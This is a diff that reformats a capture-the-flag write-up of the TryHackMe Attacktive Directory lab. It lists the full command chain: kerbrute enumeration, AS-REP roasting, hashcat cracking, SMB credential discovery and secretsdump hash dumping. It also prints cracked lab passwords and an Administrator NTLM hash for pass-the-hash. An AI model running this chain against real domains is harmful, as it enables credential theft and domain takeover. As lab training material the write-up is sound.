@@ -2,15 +2,15 @@
 
 ## Overview
 
-Full compromise of the TryHackMe Attacktive Directory domain controller by fingerprinting AD services with `nmap`, enumerating valid domain accounts with `kerbrute`, AS-REP Roasting `svc-admin` via `impacket-GetNPUsers` and cracking the ticket with `hashcat`, discovering Base64-encoded `backup` account credentials on an SMB share via `smbclient`, dumping all domain NTLM hashes using `impacket-secretsdump` DRSUAPI, and pivoting Pass-the-Hash into an Administrator shell with `evil-winrm`.
+Full compromise of the TryHackMe Attacktive Directory domain controller by fingerprinting AD services with nmap, enumerating valid domain accounts with kerbrute, **AS-REP Roasting** svc-admin via impacket-GetNPUsers and cracking the ticket with hashcat, discovering Base64-encoded backup account credentials on an SMB share via smbclient, dumping all domain NTLM hashes using impacket-secretsdump DRSUAPI, and pivoting **Pass-the-Hash** into an Administrator shell with evil-winrm.
 
-**Target:** `10.67.183.59` (Windows domain controller — spookysec.local, TryHackMe)
+**Target:** **10.67.183.59** (Windows domain controller, spookysec.local, TryHackMe)
 
 ---
 
 ## 1. Network Enumeration
 
-Full `nmap` port scan with service detection identified the target as a Windows Active Directory domain controller running the domain `spookysec.local`.
+Full nmap port scan with service detection identified the target as a Windows Active Directory domain controller running the domain spookysec.local.
 
 ```bash
 sudo nmap -sV -sC -p- 10.67.183.59
@@ -43,17 +43,17 @@ kerbrute userenum --dc 10.67.183.59 -d spookysec.local userlist.txt
 
 Notable accounts discovered:
 
-- `svc-admin@spookysec.local` - service account, potential AS-REP Roasting target
-- `backup@spookysec.local` - backup account with special domain replication privileges
-- `administrator@spookysec.local` - built-in domain administrator
+- **svc-admin@spookysec.local**, service account, potential AS-REP Roasting target
+- **backup@spookysec.local**, backup account with special domain replication privileges
+- **administrator@spookysec.local**, built-in domain administrator
 
 ---
 
 ## 3. AS-REP Roasting
 
-AS-REP Roasting targets accounts that do not require Kerberos pre-authentication. When this setting is enabled, the KDC will return an encrypted ticket without verifying the requester's identity. That ticket can be taken offline and cracked.
+**AS-REP Roasting** targets accounts that do not require Kerberos pre-authentication. When this setting is enabled, the KDC will return an encrypted ticket without verifying the requester's identity. That ticket can be taken offline and cracked.
 
-The `svc-admin` account was found to have pre-authentication disabled.
+The svc-admin account was found to have pre-authentication disabled.
 
 ```bash
 impacket-GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip 10.67.183.59
@@ -73,7 +73,7 @@ hashcat -m 18200 hash.txt passwordlist.txt
 
 <img src="04_asreproast_cracked.png" width="800">
 
-**Result:** `svc-admin:management2005`
+**Result:** **svc-admin:management2005**
 
 ---
 
@@ -87,7 +87,7 @@ smbclient -L \\\\10.67.183.59\\ -U svc-admin
 
 <img src="05_smb_shares.png" width="800">
 
-Six shares were identified. The `backup` share stood out as non-standard and was investigated further.
+Six shares were identified. The **backup** share stood out as non-standard and was investigated further.
 
 ---
 
@@ -107,7 +107,7 @@ echo 'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw' | base64 -d
 
 <img src="06_backup_credentials.png" width="800">
 
-**Result:** `backup@spookysec.local:backup2517860`
+**Result:** **backup@spookysec.local:backup2517860**
 
 The backup account has a unique permission in Active Directory that allows all domain changes to be synced to it, including password hashes. This makes it an extremely high value target.
 
@@ -123,7 +123,7 @@ impacket-secretsdump backup:backup2517860@10.67.183.59
 
 <img src="07_secretsdump.png" width="800">
 
-**Administrator NTLM hash:** `0e0363213e37b94221497260b0bcb4fc`
+**Administrator NTLM hash:** **0e0363213e37b94221497260b0bcb4fc**
 
 ---
 
